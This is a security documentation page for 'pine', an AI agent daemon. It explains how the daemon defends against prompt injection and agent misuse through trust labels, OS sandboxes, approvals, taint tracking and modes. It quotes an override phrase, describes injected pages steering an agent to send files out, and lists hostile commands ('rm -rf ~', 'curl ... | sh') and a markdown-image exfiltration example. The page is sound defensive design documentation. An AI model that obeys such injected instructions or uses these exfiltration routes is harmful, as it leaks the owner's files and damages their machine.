# Security and its limits

pine runs models that read what strangers wrote and that can run commands. This page says what
is defended, how, and what is left.

## What can go wrong

| Threat | Example |
|---|---|
| Someone outside drives the daemon | A stranger messages your bot; a web page you have open posts to the control port; someone on the network calls a webhook |
| Prompt injection | A mail, web page, MQTT message or file name says "ignore your instructions and ..." and the model follows it |
| An agent, misled or mistaken, damages the machine | `rm -rf ~`, overwriting another project, reading SSH keys |
| Information leaves | The agent is talked into sending your files to a URL, a chat or a device |
| The agent takes over the daemon | It writes an extension or changes its own configuration so that hostile code runs with the daemon's rights |

No model reliably tells instructions from data. So pine does not rely on the model refusing: it
limits what a run can do, by where its input came from.

## The layers

### 1. Who may speak

- **Telegram:** only the account you paired (with a code the bot sends it, typed into pine), or
  the user ids in `allow`, are heard. Anyone else gets no answer and causes no question.
- **Control API:** loopback by default. Every request except `GET /health` and the webhooks
  needs the bearer token in `data/http-token` (mode 600), which the CLI reads. A request with an
  `Origin` or `Sec-Fetch-Site` header or an unexpected `Host` is refused, so a web page in your
  browser cannot use it, with or without DNS rebinding. Bodies are JSON, at most 1 MB (64 MB for
  a message with files).
- **Webhooks:** each has a secret (bearer or HMAC of the body) unless set `"open": true`, a
  limit of 120 requests a minute, and a fixed topic. A request from a web page is refused here
  too; the `Host` is not checked, so a tunnel or reverse proxy in front works.
- **MQTT, watched folders:** you choose the topics and folders. What arrives is outside content.
- **The Pine app on a phone or in a browser:** off until you turn on browser access; a device
  gets in only with a key you allowed at this computer ([desktop.md](desktop.md), "What the app
  is careful about").
- **Event sources:** you set them up, or confirm what an agent sets up. One nobody is
  subscribed to does not run (unless `"start": "always"`). What they report is outside content
  unless you mark the source as yours ("Event sources" below).

### 2. Where content came from decides what it may do

Every event carries `trust`. It is `owner` when it came through a channel that authenticated
you (a paired or listed Telegram account, the control API), from a schedule, from a source
you marked `"trust": "owner"`, or from an agent's `publish_event` in a conversation that has
read no outside content. Everything else is `untrusted`.

A task started by an untrusted event runs with the agent's `untrusted` profile:

- built-in tools `read`, `grep`, `find`, `ls` only: no shell, no writing;
- no MCP servers, no delegation, no `publish_event`, no state writes, no sub-agents, no board;
- none of the tools that change pine's setup or turn to you (`add_source`, `add_mcp_server`,
  `add_skill`, `add_schedule`, `subscribe`, `request_access`, `question`), no `todo`,
  `manual` or `download`;
- no command in the background, no goal, no app control, no browser window on your screen;
- its own session (`<name>~u`), so it neither sees your conversation nor writes into it.

These tools are not hidden from such a run; they are not registered in it. The first two lines
can be widened per agent (`"untrusted": { "tools": [...], "mcp": [...], "delegates": [...],
"publish": [...], "stateWrite": true, "subagents": true, "board": true }`), or the agent can
refuse untrusted tasks (`"untrusted": false`). What such a run hands on stays untrusted. It is
never asked about more access, since nobody may be there to answer; your `approve` list,
critical actions and sending something out are still put to you. `pine check` names every
agent whose `untrusted` profile has `bash`, `write` or `edit`.

A route may declare its events trusted (`"trust": "owner"`). Do that only for a source nobody
else can write to; `pine check` lists every such route.

An event of a source that one of your conversations subscribed to is different: it is
delivered into that conversation, framed as data, and marks it as having read outside content
(layer 4) instead of starting a reduced run. `"separate": true` on the subscription gets the
reduced run back ("Event sources" below).

### 3. The sandbox

Whether an agent's shell commands and file tools run in the operating system's sandbox is
decided by its mode ("Modes" below): `safe` and `manual` work in it, `auto` and `bypass`
without it. A run that an event from outside started always works in it. The sandbox is Apple's
`sandbox-exec` on macOS and [bubblewrap](https://github.com/containers/bubblewrap) (`bwrap`) on
Linux. Windows has none of pine's; `safe` mode there is pine in WSL.

In the sandbox, on both systems:

| | |
|---|---|
| Can read | Its workspace, its private home, its skills, pine's manual (`docs/`), temp, the files its event sources received, and the system outside your home folder (programs, libraries) |
| Can write | Its workspace, its private home (`sandbox/<id>/`, which is `$HOME` in its shell), temp. The main agent also the three files for all agents in pine's home (`AGENTS.md`, `TOOLS.md`, `USER.md`), and nothing else there |
| Cannot read or write | Your home folder, pine's home (configuration, `.env`, database, other agents' folders), other agents' workspaces |
| Cannot | Use the network (unless `sandbox.network`, or you granted it to the conversation), signal or inspect other processes, or reach your session's services: launching apps, AppleScript, the keychain or keyring, the clipboard, the session bus, a container daemon, an ssh agent |
| Can compute on | macOS: the graphics chip and the neural engine (a Swift script that reads a scanned page with Vision works). They reach no file, address or program |
| Environment | A handful of variables (`PATH`, `LANG`, ...): nothing from the daemon's environment, no secrets. `HOME` is the private home |

The files an agent's event sources received (a camera's upload, a photo sent through
Telegram) lie in `data/sources/<name>/`. An agent reads those of its own sources and of the
sources it is subscribed to, in every mode, and writes none of them; the rest of pine's data
stays closed ([sources.md](sources.md), "Files a source received").

The file tools (`read`, `write`, `edit`, `grep`, `find`, `ls`) do their work inside the
sandbox too, so a path swapped for a link after a check gains nothing: the operating system
decides at the moment of access. Without a sandbox a check in the daemon holds them: pine's
home and program stay closed, and after outside content so do the files read as instructions.

A folder you open for a conversation is that conversation's to read and write, and its
sub-agents', never a run that outside content started. Only you open one, and pine's home and
program and other agents' workspaces are refused. Its `AGENTS.md` and `CLAUDE.md` become
instructions ([coding.md](coding.md)).

Looking at a folder in a UI's code pane runs nothing from it. Saving a file from an editor
(`POST /agents/<id>/view/write`) and the file tree's changes go through a helper in a sandbox
that may write that folder alone, so a planted link is never written through; without a sandbox
nothing is written that way.

Consequences worth knowing:

- An agent cannot change its `agent.json`, its extensions or `pine.json`. Rules it must never
  change go into `agents/<id>/AGENTS.md`, outside its reach.
- Tools that need files in your home (`~/.gitconfig`, `~/.npmrc`, `~/.ssh`, a toolchain there)
  see the agent's empty private home. Grant folders with `sandbox.read` / `sandbox.write`, or
  use `auto` mode.
- Without a working sandbox (Linux without bubblewrap or user namespaces, a container without
  the rights, any other system) `safe` cannot be had: an agent whose mode nobody chose works in
  `auto`, one set to `safe` gets no shell, a run started from outside gets no shell, and
  `command` sources do not run. `pine check` says so and why.
- A local MCP server you added is your program with your rights. One an agent added
  (`add_mcp_server`) runs where that agent's commands run; mark one of yours `"sandboxed": true`
  to run it the same way ([mcp.md](mcp.md)).
- `trustWorkspace` stays `false`: nothing executable is loaded from the workspace.

#### Worktrees

A conversation in a worktree ([coding.md](coding.md), "A worktree for a conversation") reads and
writes its worktree. Of the repository's shared git folder it writes only what its own git needs:
the objects, its worktree's index and HEAD, and branches under `pine/`. The repository's
configuration and hooks, your branches, the main checkout and the other worktrees stay closed,
by pine's record of the worktree, never by a file in it. Still shared: it could damage the
objects, and it can move any branch under `pine/`. pine's own git calls for a worktree run with
hooks off and the repository's filters and merge drivers replaced.

#### On Linux

The sandbox needs bubblewrap, allowed to create user namespaces. `pine init` sees to both, and
to the browser's system libraries: it shows the commands it would run as administrator and runs
them after one yes (`pine init --yes` does not ask). Where the sandbox does not work, `pine
check` gives the reason.

- **bubblewrap missing:** installed with the system's package manager (apt, dnf, yum, pacman,
  zypper, apk).
- **Ubuntu 24.04 and later** restrict user namespaces through AppArmor. pine writes a rule that
  allows them for bubblewrap alone to `/etc/apparmor.d/bwrap` and loads it.
- **A container** (Docker, Podman) allows no sandbox inside unless started with the rights for
  one. With pine as root in the container: `--cap-add SYS_ADMIN --cap-add NET_ADMIN
  --security-opt seccomp=unconfined --security-opt apparmor=unconfined`; as an ordinary user
  also `--security-opt systempaths=unconfined` (`--privileged` does all of it). `pine init`
  names the flags that are missing. Without them the container is the only wall, around all
  agents and pine's secrets together, and agents whose mode nobody chose work in `auto`: a fair
  way to run pine. The flags, for `safe` mode inside, take away most of what the container
  protects.
- **No `sudo` and not root:** pine prints the commands for whoever administers the machine.
- **The browser's libraries:** installed where apt is; elsewhere named. Web search works without.
- **A systemd unit** with `RestrictNamespaces=` or `PrivateUsers=` prevents the sandbox.

What differs from macOS:

| | macOS | Linux |
|---|---|---|
| Your home folder, pine's home | Refused | Empty, read-only folders, with only the way to the agent's own folders in them |
| Instruction files, a repository's hooks and configuration, after outside content (layer 4) | Cannot be written or created, at any depth | What exists is read-only; a new one a shell command creates is removed when it ends. Looked for six folders deep (not in `node_modules`, `dist`, `build` and the like), in at most 20000 folders; past that the file tools refuse to write |
| Other programs (session bus, keyring, container daemon, terminal multiplexer) | No connection without the network; keychain, clipboard, AppleScript and launching apps refused also with it | No socket to another program without the network (32-bit programs do not run then); `/run/user` and the sockets in `/run` closed also with it |
| With the network granted | The internet and your local network; socket files stay closed outside the agent's own folders | Also programs on a socket file outside `/run` (a tmux server, an ssh agent in temp) and an X server |
| Processes a command leaves running | Not ended by the sandbox ([coding.md](coding.md), "What an agent left running") | In the sandbox they end with the command; without one (`auto`, `bypass`) as on macOS |
| A command in the background after outside content | Allowed, with the same limits | Refused: what such a command may not create is only taken away when it ends |
| pine run as root | Commands run as root | Commands run as root without root's capabilities |

The file tools refuse a protected name at any depth on both systems.

### When a call needs something outside: pine asks you

An agent in the sandbox (`safe`, `manual`) need not know where it ends, nor ask. When one of its
calls needs a file or folder of yours, or the network, pine asks you itself, although the agent
never asked: an approval named `request_access` that says what is wanted and for which call.

| When | What happens |
|---|---|
| A file tool is given a path outside the agent's folders | You are asked before the call. Yes: it runs. No: refused, and the agent is told you said no |
| A shell command names such a path (`cat /Users/you/notes/a.txt`, a redirect into one, `cp` to one) | You are asked before it runs: for reading a path that exists; for writing the target of a redirect and what `touch`, `mkdir`, `rm`, `mv`, `tee`, `cp` and the like name |
| A command writes `~` or `$HOME` for something in your home | In the agent's shell `~` is its private home (`sandbox/<id>/`). You are asked for the path in your home, and the agent is told to run the command again with the path written out |
| A command is refused something it did not name (a script opens a file, a program wants the network) | macOS: pine reads the system's reports of what the sandbox refused that command, asks you, and adds a line to the command's output: what was refused, your answer, and to run it again after a yes |

A yes holds for the conversation and its sub-agents until it is reset or pine restarts; a no is
kept as long, and not asked again. The agent can also call `request_access` itself, with a
reason. Never asked: pine's home, pine's code, other agents' workspaces, which no answer opens.
What a program looks for on its own (dot files, `Library`) is asked only when the command names
it, the network only after a command failed without it, and a run from outside never. After
outside content the question begins "Careful: ...". On Linux pine goes by the paths a command
names and by the words of a failed command ("Operation not permitted", "Could not resolve
host"); what the agent gets is what you grant.

To turn the question off, set `security.askAccess` to `false` (Settings > Security, "Ask when an
agent needs more"): you are then asked only when the agent calls `request_access`.

### The whole account

An agent that is to do real work on your machine needs what you have at your terminal: your
projects in your home folder, your programs and toolchains, your git and ssh setup, the network,
and the right to stop a server it started a minute ago. In `auto` mode it has that, without
asking, because its commands run without a sandbox:

| | |
|---|---|
| Files | Everything your user account can open and change |
| Closed | pine's home (configuration, `.env`, the token, database, other agents' folders), except its own folders there, and changing pine's program files. Kept by reading what runs, not by the operating system: see below |
| Network, processes, apps | As you: install packages, start and stop programs (`ps`, `kill`, `sudo`), open a browser |
| Environment | Yours, with your home as `$HOME`. Variables whose name looks like a credential (`KEY`, `TOKEN`, `SECRET`, `PASSWORD`, `AUTH`, ...) are left out, except the ssh agent's address; add what the agent should have with `sandbox.env` |

`bypass` has the same reach and asks nothing. To keep an agent inside its own folders, set it to
`safe`.

#### pine's own files without a sandbox

Without a sandbox (`auto`, `bypass`), pine keeps agents out of its home and program by reading
what is about to run:

| What | How it is kept closed |
|---|---|
| A file tool on a path in pine's home, or writing one in pine's program | Refused by a check in the daemon |
| A shell command that names a path in pine's home: written out, with `~` or `$HOME`, or with `..` from where the shell starts | Not run. The files its event sources received are the exception: reading them runs, plainly writing or deleting them does not |
| A shell command that plainly writes into pine's program (a redirect, `touch`, `rm`, `cp` to it) | Not run |
| A shell command that starts the `pine` program, or names pine's control port on this computer | Not run |
| Any other shell command that names pine's program files and does more than look | Critical: you are asked (not in `bypass`) |

This is a net, not a wall: what a script or a variable holds is not seen, `grep -r secret ~` is
not followed into pine's home, and whoever holds the token in `data/http-token` can answer
approvals and change modes. For an agent that should not depend on it, use `safe` mode.

### What asks you

No model judges what an agent does. In `auto` and `safe` mode an agent works without asking,
with these exceptions:

| The action | Examples | When you are asked |
|---|---|---|
| is critical | writing shell startup files, ssh keys, git hooks or a repository's configuration, launch agents; a force push, `git reset --hard`, `git clean -f`, `curl ... \| sh`, `sudo`, deleting a home folder, `chmod -R` on a home folder, installing something that starts by itself (`crontab`, `launchctl load`, `systemctl enable`) | In every conversation |
| sends something out | what the agent's `approveWhenTainted` names (default `publish_event` and `send`, except a `send` that reaches only you), the acting tools of MCP servers marked `"approve": "tainted"`, a task for another agent (its answer can carry that agent's files back), `subscribe` | Once the conversation has read outside content |
| changes the agent's own memory or instructions (`safe` mode only) | `MEMORY.md`, `AGENTS.md`, `SOUL.md`, `TOOLS.md` in its workspace; for the main agent also `AGENTS.md`, `TOOLS.md`, `USER.md` in pine's home | Once the conversation has read outside content, once for the conversation ("Its own memory and instructions after outside content") |
| is on the agent's `approve` list | `"approve": ["bash:*git push*", "send:house", "mcp__calendar__delete_*"]` in `agent.json`; an MCP server with `"approve": "always"` | Every time, in every mode but `bypass` |

Everything else runs, also after outside content: shell commands, files the agent reaches,
downloads, a message to you. `manual` asks about every action, `plan` refuses what does not only
look, `bypass` asks nothing ("Modes").

**Telling you is never asked about.** An agent that watches something has read outside content
by the time it has something to say, often when you are away. So a `send` through a source that
reaches only you (Telegram, which writes only to your chat) goes out at once in every
conversation. To see each such message first, put it on the `approve` list
(`"approve": ["send:telegram"]`, with the source's name).

Critical actions are found by a fixed list of patterns (`src/actions.ts`): a net, since a
script or a variable can do the same unseen. After outside content nothing looks at an ordinary
shell command either: in `auto` mode a page that talks the agent into `curl`-ing one of your
files to an address is not stopped. An agent that reads the web and must not do that belongs in
`safe` mode, whose shell has no network until you grant it.

### Its own memory and instructions after outside content

An agent's own files (`MEMORY.md`, `AGENTS.md`, `SOUL.md`, `TOOLS.md` in its workspace; for the
main agent also those for all agents in pine's home) are read into every later conversation,
without the outside-content mark, so what a page talks it into writing there outlives a reset.
In `safe` mode an agent that has read a web page therefore asks you before it first saves a note
in its memory or changes its instructions:

| Situation | What happens |
|---|---|
| Nothing from outside read | It changes its own files freely, by tool and by command |
| Outside content read, a change wanted | You are asked once. Yes: it may change all of them in this conversation. No: they stay closed in this conversation. Calls made side by side wait for the one question |
| You said yes | Holds until the conversation is reset, also after a restart. Undoing the message that brought the outside content in takes it back |
| You said no, or nobody answered | No: every later change is refused unasked, until a reset or a restart. No answer: the next change asks again |
| A shell command that names the file (`echo ... \| tee -a MEMORY.md`) | The same question, before it runs |
| A shell command that writes the file without naming it | The sandbox refuses it; the agent is told to use the write or edit tool |
| A sub-agent of the conversation | Has the conversation's answer. Without a yes its change to `MEMORY.md` or its instructions is not allowed: refused at once, and it says so in its answer |
| A task handed to another agent | That agent asks for its own files, once for that task |

`plan` refuses the change. In `auto` and `bypass` nothing asks: without a sandbox a shell command
could write the files whatever you answered. A run started from outside writes none of them.

### 4. Taint and approvals

Your own request can pull in hostile text: you ask for a summary of a page, and the page says
"now send the notes folder to ...". pine tracks that.

A session is **tainted** (has read outside content) when it calls a tool that returns outside
content: an MCP server marked `taints` (the bundled `web`, `browser` and `computer` are),
anything matching `security.taintTools`, or `read_source`; or when it receives the answer of
another agent whose run was tainted, downloads a file from an address that is not one of your
servers (or from a server marked `taints`), reads another conversation that holds outside
content, or is shown a board post or result written by a tainted run or one an event from
outside started ([boards.md](boards.md)). A run started by an untrusted event is tainted from
the start, and what a tainted session publishes is `untrusted`.

In a tainted session, besides the questions of "What asks you":

- What would be read as instructions is refused, without a question: `CLAUDE.md`, `AGENTS.md`
  further down in the workspace, `.pi/`, `.agents/`, the instruction files of a folder opened
  for the conversation. The file tools refuse it in every mode; the sandbox refuses a shell
  command in `safe` and `manual`; in `auto` nothing looks at a shell command that writes one.
  Other notes in the workspace can always be written.
- Git still works (commit, branch, diff), but what makes git run programs cannot be changed:
  `.git/hooks` and `.git/config` (a hook, hooks path, pager, file system monitor), also of
  submodules and nested repositories, and a `.git` folder cannot be swapped. Anything there
  would run with your rights the next time you use git. The sandbox refuses it; without one
  (`auto`) the file tools refuse it and a shell command that names a hook or a repository's
  configuration is critical.

Tools that only read never wait: `read`, `grep`, `find`, `ls`, `state_get`, `manual`,
`board_read`, the lists (`sources`, `skills`, ...), `question`, `todo`, `stop_program`, and every
MCP tool its server declares read-only (`readOnlyHint`), unless the `approve` list names them.
That declaration is the server's word; set `"approve": "always"` on a server to have every call
asked, reading included.

An approval arrives in the terminal UI and the Pine app as a dialog, and in Telegram with
buttons (a bot that is one agent's own shows only that agent's), with the tool, its arguments
and why you are asked. `pine approvals`, `pine approve <id>` and `pine deny <id>` do the same
from a shell. No answer within `security.approvalTimeout` means no.

There are three answers: allow once, deny, and **always in this conversation** ("Always here"
in the UI, "Always: ..." in Telegram, `pine approve <id> --always`). "Always" covers the whole
MCP server the tool belongs to, or the one tool otherwise (`bash`), and for a critical action
that kind of action (for example "runs with administrator rights"), until the conversation is
reset or the daemon restarts. It is not offered for what you set to ask every time (the
`approve` list, `"approve": "always"`). A yes given while the conversation was clean does not
carry over once it has read outside content: you are asked again.

How long the mark lasts is `security.taint`: `session` (default) until the conversation is reset
(`/reset`, `pine reset`), since the text is still in the context; `run` forgets it after each
task (weaker); `off` marks nothing. Runs started by outside events stay restricted in every
setting. Taking back the very message that brought the outside content in clears the mark
([coding.md](coding.md), "Taking a message back"). A branch ([agents.md](agents.md#branching-a-conversation)) starts with the mark the
conversation had at that point, and without what you allowed the original.

### Modes: how much an agent does without asking

Each agent has a mode. It says both whether there is a sandbox and what is asked; there is
nothing else to set.

| Mode | Sandbox | What asks you |
|---|---|---|
| `auto` (the main agent, unless you say otherwise) | Off: shell and file tools reach your whole account and the network | Your `approve` list; a critical action, in every conversation; after outside content, sending something out ("What asks you") |
| `safe` (every other agent, unless you say otherwise) | On: the agent's own folders. Beyond them you are asked, by pine when a call needs it or by the agent with `request_access` | As `auto`, and after outside content a change to its own memory or instructions, once for the conversation |
| `manual` | On, where the machine has one | Every action that changes or sends something, a message to you through Telegram included, unless you answered "always" for it here. What only looks is free: reading files and state, `read_source`, the lists (`sources`, `skills`, ...), read-only MCP tools |
| `bypass` | Off, like `auto` | Nothing |
| `plan` | That of the mode the agent had before | Nothing, because nothing is done: a call that does not only look is refused ("Plan mode") |

pine's home and program are closed in every mode. A run that an event from outside started (a
webhook, a message from a stranger, a source's report) works in the sandbox whatever the mode: you are
never asked to give it more access, and what your
`approve` list names, a critical action, or sending something out is still put to you.

The same actions in each mode ("after outside content": after the conversation has read a web
page, a message from somebody else or other outside content):

| Action | `bypass` | `auto` | `safe` | `manual` | `plan` |
|---|---|---|---|---|---|
| `ls`, `cat`, `git status`, reading files, web search and reading pages | runs | runs | runs | runs | runs |
| Writing a file in its own workspace | runs | runs | runs | asks | refused |
| `npm install`, `git commit`, editing a project file in your home | runs | runs | asks once for access to that folder | asks | refused |
| `curl`, `git push`, anything that needs the network from the shell | runs | runs | asks once for network access | asks | refused |
| `sudo`, a force push, `git reset --hard`, `curl ... \| sh`, shell startup files, ssh keys | runs | asks | asks | asks | refused |
| A tool on the agent's `approve` list | runs | asks | asks | asks | asks if it only looks, else refused |
| Sending an event, an MQTT or Slack message, a task for another agent | runs | runs | runs | asks | refused |
| The same after outside content | asks (bypass is paused then) | asks | asks | asks | refused |
| A Telegram message to you, also after outside content | runs | runs | runs | asks | refused |
| Writing its own `MEMORY.md`, `AGENTS.md`, `SOUL.md` or `TOOLS.md` | runs | runs | runs | asks | refused |
| The same after outside content | runs | runs | asks once for the conversation | asks | refused |
| Writing `CLAUDE.md`, `.pi/`, `.agents/`, a git hook or a repository's configuration after outside content | file tools refuse; the shell runs | file tools refuse; the shell runs, and a command that names a hook or a repository's configuration asks | refused | refused | refused |
| Opening an address on this computer or your network in the browser | runs | asks once for that address | asks once for that address | asks once for that address | refused |
| Operating your apps (`computer` server) | runs | asks once for each app | not available: it needs your whole account | not available | looking at an app runs (after your yes for it), acting refused |
| Starting sub-agents | runs | runs | runs | asks | refused |

So `auto` asks rarely, `safe` asks when the agent leaves its own folders, `manual` asks every
time, and `plan` only looks. A yes to an address in the browser ([mcp.md](mcp.md), "Local
addresses") or to an app ([computer.md](computer.md)) holds for that address or app in the
conversation. An address you type yourself into the Pine app's browser is allowed without a
question; pine's control port stays closed.

**Sub-agents share their conversation's permissions**: the access you granted, your "always"
answers, its folder and its outside-content mark. A sub-agent never asks you anything: where you
would be asked, it is refused and says what it needed, and its conversation can ask. An agent a
task is *delegated* to works with its own permissions, held to the caller's mode where that is
stricter: an agent in `safe` mode cannot reach your account through one in `bypass`
([agents.md](agents.md), "Handing work to another agent").

**Bypass is paused after outside content**: the conversation behaves like `auto` until it is
reset, since bypass plus a hostile page is your whole account. The terminal UI shows "bypass
(paused)", and the agent is told. Two ways to have bypass anyway:

- For one conversation: choose bypass in a conversation that already read outside content, and
  answer "bypass in this one anyway" instead of a clean conversation. It holds until a reset or
  a change of mode.
- Always: `"security": { "bypassWhenTainted": true }`, which `pine check` names.

With either, the guards on instruction files and git settings no longer hold for shell commands
in that conversation; the file tools still refuse them.

Set the mode in `agent.json` (`{ "mode": "manual" }`), for all agents that name none with
`defaults.mode` in `pine.json` ([configuration.md](configuration.md)), or switch it while
running: `/mode` or `shift+tab` in the terminal UI, `pine mode <agent> <mode>` from a shell. A
switch to `auto`, `safe` or `manual` is saved in `agent.json`; one to `bypass` or `plan` lasts
until pine restarts.

#### Plan mode

In `plan` what only looks runs; everything else is refused, without asking you:

| In plan mode | Examples |
|---|---|
| Runs | `read`, `grep`, `find`, `ls`; shell commands that only read (`ls`, `cat`, `git status`, `git diff`); web search and page reading; MCP tools their server declares read-only; `manual`, `state_get`, `sources`, `schedules`, `mcp_servers`, `skills`; `question` and `todo`; the conversation's own board (`board_read`, and `board_post`, `board_claim`, `board_done`, `board_answer` without a board's name); `stop_program`; looking at an app (after your yes for it) |
| Refused | `write`, `edit`, every other shell command (a redirect such as `> file` included, and every command in the background), `download`, `send`, `publish_event`, `state_set`, the board tools with a board's name, `board_remove`, `delegate`, `subagent`, `request_access`, every tool that changes the setup (`add_...`, `remove_...`, `subscribe`), MCP tools not declared read-only (opening a page in the browser, a `commands` server's tools), acting in an app |

The agent answers with a plan and is told when you switch the mode off. A run started from outside
is held to it too. Plan mode is a way of working, not a wall: a shell command counts as looking by
its name, an MCP tool by its server's word, and the sandbox is that of the mode before planning.

### Downloads

The `download` tool fetches a file into the workspace, byte for byte, with its size and SHA-256,
also where the shell has no network. The file is put in place through the agent's sandbox.
`limits.maxDownloadMb` (200) caps the size. A run started from outside has no such tool.

- An address on the origin of one of the agent's remote MCP servers (same scheme, host and port)
  is fetched without a question; a redirect elsewhere is not followed under this rule.
- A server's `headers` (its key) go only with an address one of that server's tools returned in
  the same conversation, exactly as returned: never to an address the agent made up, never along
  a redirect, never for a server marked `taints`. The key stays out of the conversation.
- With the bundled `web` or `browser` server, any public https address is fetched without a
  question, also after outside content. The `web` server's `allowHosts` and `denyHosts` apply
  while the conversation has no network of its own, and its `allowPrivate` too.
- Otherwise an address needs network access for the conversation (`sandbox.network`, a grant, or
  `auto`/`bypass`); without it the download is refused, unasked. With it, only public https
  addresses.
- A file from an address that is not one of your servers, or from a server marked `taints`,
  marks the session as having read outside content.

### Pictures and links in an answer

- A picture at a web address is fetched only when you click it, never because an answer contains
  it: otherwise `![](https://somewhere/?q=<your notes>)` would send data out the moment it is
  shown. The UIs show where a link goes.
- A workspace picture's path comes from the model, so the control API serves only image, video
  and sound files (checked by content) that really lie in the agent's workspace or the
  conversation's folder, also not through a link. All picture routes need the token.
- Pictures, video and sound are decoded by `sips`, `ffmpeg` or `afconvert` without network and
  without write access outside temp, since the bytes can come from anywhere; "Open in player"
  hands a file to the system's player only on your click.
- Pictures a tool returned are kept in `data/media/tool` (mode 600) as long as the event log
  (`limits.eventRetentionDays`).

### Event sources

A source brings in outside content by design, and a subscription lets it start an agent turn
without you ([sources.md](sources.md), "Trust"). What keeps that safe:

- Events are outside content unless the source is marked `"trust": "owner"`. By default an event
  is delivered into the subscribed conversation, framed as data, and taints it: sending out asks
  you, bypass is paused. `"separate": true` on the subscription starts a reduced run of its own
  instead (layer 2): the stronger protection for sources that carry strangers' text.
- An agent sets up a source (`add_source`) only in a conversation with you, and you confirm
  everything that opens something new: a folder outside its workspace, a connection, a port, a
  source for all agents, a trusted source. A secret pine makes is never shown to the model, and
  every secret is kept in `.env`, out of events and logs.
- `subscribe` is not in a reduced run, and asks you after outside content: a page must not make
  an agent start listening. An unsubscribed source does not run: no port, no connection.
- A type that listens on a port (`ftp`, `smtp`, `syslog`, `webhook`) only receives, and needs a
  password, a secret or a list of client addresses, or the dialog and `pine check` say that
  anyone on the network can write to it.
- A type that connects out reaches only the address you confirmed: a public name that later
  leads into your network is refused, a redirect to another host is not followed, a token goes
  only to its host.
- What people write is never taken for your words: `mail`, `smtp`, `slack`, `matrix`, `discord`
  and `zulip` report outside content whoever a message claims to be from. Do not give them
  `"trust": "owner"`; `pine check` names every source that has it.
- A source that can send (`mail`, `slack`, `matrix`, `discord`, `zulip`, `mqtt`) sends only to
  the addresses, channels or topics on its own list, checked by the type itself.
- `read_source` (earlier messages of a Slack channel) reads only where the source listens, and
  what it returns taints the conversation. A run from outside does not have it.
- A `command` source runs in the sandbox of the agent it belongs to, whatever that agent's mode:
  its folders, no network, not your environment, instruction files read-only. You see the
  command line first. Without a sandbox it does not run; with `follow` it is refused on Linux.
- `http` with `render` looks with pine's browser behind the browser tools' guard, with no tools,
  cookies or token; the page's scripts run, which the dialog says. The `system` type starts a
  helper pine built itself; no option names a program.
- A status line is read without the outside-content mark, so it repeats a found value only when
  it is a number or a single word.
- A subscription has a throttle (10 s by default), so a chatty device cannot keep a model busy.

Each type's own limits are in [source-types.md](source-types.md).

### A new kind of source is a program

A source type runs inside pine with pine's rights; no sandbox applies. It gets in by your hand
(`sourceTypes` in `pine.json`, or `"use"` on a source) or through the main agent's
`add_source_type`, and then only from the main agent in a conversation with you, never from one
that has read outside content (refused without asking), with your yes in a dialog that says it is
a program, its size, its imports and its file, in every mode and every time, and as a copy pine
takes into its home at that moment: what you confirmed is what runs. Read the file before you
confirm. `pine check` lists every registered type and every source with `"use"`.

### What no mode opens

- **pine's home** (configuration, `.env`, credentials, database, other agents' folders). Agents
  never write there; what they may set up goes through tools that check their input, write only
  that entry, and ask you where [setup.md](setup.md), "What you are asked", says. Only the main
  agent sets up anything for all agents, creates and changes agents, adds model servers, and
  changes settings and routes; such a change is shown to you first, read back and undone if it
  does not load, and refused in a conversation that has read outside content (routes and
  decision models are put to you there instead). A proposal from such a conversation says so in
  the dialog: a page asking for "this handy server" is the obvious trick.
- **pine's program files**, for writing.
- **More for a run started from outside.** It keeps the `untrusted` profile.

### Schedules act in your name

What a schedule starts counts as your wish: the agent has its usual tools and nothing is marked.
So an agent schedules without a question only for its conversation, or for itself from its main
conversation (not in manual mode); for itself from a side conversation, or for all agents (main
agent only), you are asked. After outside content you are asked in every case and see the task:
a sentence on a page must not become something done every hour. A schedule is an entry in pine's
configuration, which agents cannot write ([events.md](events.md), "Schedules").

### A goal goes on in your name

With `/goal` pine calls an agent again until an objective is met ([agents.md](agents.md), "Goal
mode"). Only you set, pause, resume or clear a goal; no tool reaches it. What calls the agent
again is your objective inside fixed text of pine's, never the agent's answer or the judge's
reason, which could repeat a web page in your voice. The judge can only say one of three words: a
wrong "met" or "blocked" stops the work, a wrong "continue" costs rounds (at most
`limits.goalRounds`), and no verdict pauses. A run from outside has no goal. Every round works
under the mode and approvals as any task, and your own message, `esc`, a failed round or a
restart pause it.

### A swarm goes on in your name

With `/swarm` an agent leads a job and is called again while tasks on the conversation's board
are not done ([boards.md](boards.md), "A swarm"). As with a goal, only you start, pause, resume
or clear one, and no tool reaches it. What calls the lead again is your job and fixed text with
task counts, never a word of an answer or a check; the lead reads those from the board, where
they carry the mark of the run that wrote them. The board decides when it is done, not a model;
it stops after `limits.swarmRounds` turns and waits for you after a restart. A run from outside
has no swarm, and every turn and sub-agent works under the conversation's mode and approvals.

### Commands in the background

A command started with `background: true` ([coding.md](coding.md), "Commands in the
background") runs in the sandbox the conversation's other commands run in, so running on gives it
nothing more. Only your own conversations can start one (at most eight at a time); a run from
outside cannot, nor, on Linux, a conversation that has read outside content. pine finds what is
running itself, stops only what the conversation's own commands started, and tells the
conversation of the end in a message of its own with the output quoted, never as your words.

### Undo is yours

`/undo` takes back your last message with the files it changed ([coding.md](coding.md), "Taking
a message back"). Only you undo, only a message you typed, never a run outside content started.
The folder's states are kept in `data/snapshots`, which no agent can write, and put back by git in
a sandbox that writes only that folder, with no hook or filter and never through a link. The
outside-content mark and what you allowed go back to what they were before the message, never
to more. What left the machine (a message, a push) is not taken back.

### Skills are instructions

A skill is read into an agent's prompt, so it is guarded like the instruction files. Skills lie
in pine's home, which an agent reads and never writes; only `add_skill` writes them. After
outside content a skill is put to you with its instructions, for every scope; one for all agents
(main agent only), one an agent adds for itself from a side conversation, and every skill in
manual mode are shown to you too. A link in a skill's folder is refused. Its scripts run like
anything else the agent runs ([agents.md](agents.md), "Skills").

### Outputs check for themselves

Whatever asks, the Telegram source sends only to your own chat and the MQTT source only to the
topics on its `publish` list. An agent's `publish` list names the topics it may use at all, and
no agent publishes on pine's own topics (`agent/`, `approval/`, `board/`, `pine/`, `state/`,
`timer/`).

### Secrets

Secrets live in `.env`, are filled into the configuration and never put into pine's environment,
so child processes do not inherit them. Known secret values (every `.env` value of eight
characters or more, bot tokens, the control token) are replaced with `[redacted]` in events,
outgoing messages and logs. A tool that needs a secret leaves it out and you type it into pine's
own dialog, so no model sees it. A secret you write into a conversation anyway is redacted from
then on, but the history and the model have seen it: change it if the model is not yours. See
[configuration.md](configuration.md), "Secrets". `pine check` reports configuration files, and a
home folder, that other users can read.

### Limits against runaway behaviour

